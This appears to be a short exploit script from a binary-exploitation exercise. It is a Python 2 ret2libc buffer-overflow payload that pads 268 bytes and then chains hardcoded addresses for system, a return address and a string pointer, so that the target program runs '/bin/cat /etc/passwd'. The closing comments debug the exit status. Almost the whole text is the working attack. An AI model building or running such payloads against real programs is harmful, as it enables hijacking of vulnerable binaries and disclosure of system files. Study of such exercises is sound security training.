
# overflow + addr of system + retaddr of system + addr of string + actual string

exploit = b"A"*(268) + b"\xb0\x5d\xe4\xf7" + b"\xe0\x99\xe3\xf7" + b"\xa8\xd8\xff\xff" + "/bin/cat /etc/passwd\x00"
print exploit

# this currently calls libc exit, but exits w status 57... we could also ask about returning to addr
# in main where exit(0) is called?
